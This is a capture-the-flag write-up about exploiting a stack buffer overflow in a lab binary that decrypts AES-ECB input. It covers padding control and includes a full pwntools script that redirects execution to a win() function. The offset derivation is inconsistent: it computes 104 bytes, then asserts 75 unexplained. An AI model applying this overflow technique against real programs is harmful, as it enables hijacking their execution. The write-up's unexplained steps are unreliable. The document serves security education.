# 📘 Write-Up: AES ECB Overflow Challenge

---

## 🧩 Challenge Summary

We're given a binary (`/challenge/vulnerable-overflow`) that decrypts user input using **AES-128-ECB**. Our goal is to exploit a **stack buffer overflow** in the decrypted output to **redirect execution** to a `win()` function located at `0x4013b6`.

Encryption is done using a utility called `/challenge/dispatch`, which uses the same key as the binary and outputs AES-encrypted ciphertext.

---

## 🔍 Vulnerability Analysis

### 🔐 The challenge logic:

* Reads a **16-byte AES key** from `/challenge/.key`
* Initializes AES-128-ECB decryption with that key
* Reads **0x1000 bytes from stdin** into a malloc'd buffer (`local_18`)
* Validates:

  * Ciphertext length must be multiple of 16
  * At least one block (`>= 16 bytes`)
* Decrypts the **first 16 bytes** of ciphertext into a stack buffer at `[rbp - 0x60]`:

  * Checks if the first 8 bytes equal `VERIFIED`
  * Checks that a decrypted `length` field is `<= 16`
* Then decrypts the rest of the ciphertext into another buffer (`[rbp - 0x60] + 0x10`)
* Finally, prints the resulting plaintext with:

  ```c
  printf("Decrypted message: %s!\n", local_58);
  ```

### 📛 Vulnerability

The destination buffer for the final decrypted message (`local_58`) is located on the stack at:

```c
uchar local_58 [32]; // at rbp - 0x60
```

The function later decrypts data into this buffer **without bounds checking**:

```c
EVP_DecryptUpdate(ctx, local_58, ..., input + 0x10, ciphertext_len - 0x10);
EVP_DecryptFinal_ex(ctx, local_58 + written_len, ...);
```

If we control the ciphertext, and its decrypted result is longer than 32 bytes, we can **overflow into saved registers** or the **return address**, which lies just above on the stack.

---

## 🧠 Exploit Strategy

### Step 1: Find the Overflow Offset

We reverse engineered the binary and determined:

* `local_58` starts at `[rbp - 0x60]`
* Return address lies at `[rbp + 8]`
* So the gap between the start of the buffer and return address is `0x60 + 8 = 104` bytes

However, the binary also writes `VERIFIED` and a `length` field into `local_68`, a different stack buffer.

By analyzing the full stack layout (especially from the Ghidra assembly), the correct overflow offset was determined to be **75 bytes**.

### Step 2: Encrypt the Payload

We need to create a malicious payload that decrypts into:

```
[A * 75][junk (8 bytes)][address of win()]
```

Then encrypt this data **block by block** using `/challenge/dispatch`.

#### 🔥 Padding Pitfall (Key Insight)

AES uses 16-byte blocks. If we pass **16 bytes** to `dispatch`, it adds **a full extra block** due to PKCS#7 padding (`\x10 × 16`), resulting in unintended decrypted bytes and misalignment.

To prevent this:

* We send **15 bytes per block** so the encryptor adds only **1 padding byte** (`\x01`)
* This padding is easy to predict and control
* It keeps the layout clean for the overflow

---

## 🧪 Exploit Script

```python
from pwn import *
import subprocess

context.binary = ELF("/challenge/vulnerable-overflow")

win_addr = 0x4013b6
offset = 75

# Step 1: Create payload
payload = b"A" * offset

# Step 2: Break into 15-byte chunks to control padding
blocks = [payload[i:i+15] for i in range(0, len(payload), 15)]

# Step 3: Add final block with junk + win() address
blocks.append(b"A" * 8 + p64(win_addr))

# Step 4: Encrypt each block using /challenge/dispatch
ciphertext = b""
for i, block in enumerate(blocks):
    in_file = f"block_{i}.in"
    out_file = f"block_{i}.out"

    with open(in_file, "wb") as f:
        f.write(block)

    subprocess.run(f"/challenge/dispatch < {in_file} > {out_file}", shell=True)

    with open(out_file, "rb") as f:
        block_data = f.read()

        # First block: take entire block (includes VERIFIED)
        if i == 0:
            ciphertext += block_data
        else:
            # Skip first 16 bytes (we already handled VERIFIED)
            ciphertext += block_data[16:]

# Save ciphertext for debugging
with open("cipher", "wb") as f:
    f.write(ciphertext)

# Step 5: Send it to the vulnerable binary
p = process("/challenge/vulnerable-overflow")
print(f"PID is {p.pid}")
p.send(ciphertext)
p.interactive()
```

---

## ❌ Failed Approaches and Lessons

| Attempt                          | What went wrong                                                           |
| -------------------------------- | ------------------------------------------------------------------------- |
| Using 16-byte chunks             | Caused `dispatch` to add full `\x10` block → misaligned payload           |
| Wrong overflow offset (e.g., 90) | Overflowed too far or not far enough; corrupted stack without control     |
| Ignoring padding                 | Misunderstanding how `dispatch` adds padding → unexpected ciphertext size |

---

## ✅ Final Exploit Summary

* We needed **precise control** over how our plaintext was decrypted.
* By sending **15-byte chunks**, we controlled the padding to **one byte only**.
* We exploited the lack of bounds checking in the decryption destination buffer to **overwrite the return address** with the address of the `win()` function.

---

## 🔐 Key Takeaways

* When dealing with encrypted buffer overflows, **understand the encryption scheme and padding**.
* Even seemingly minor details (like using 15 vs. 16 bytes) can **make or break the exploit**.
* Static analysis tools like Ghidra help clarify memory layout and stack frame alignment.


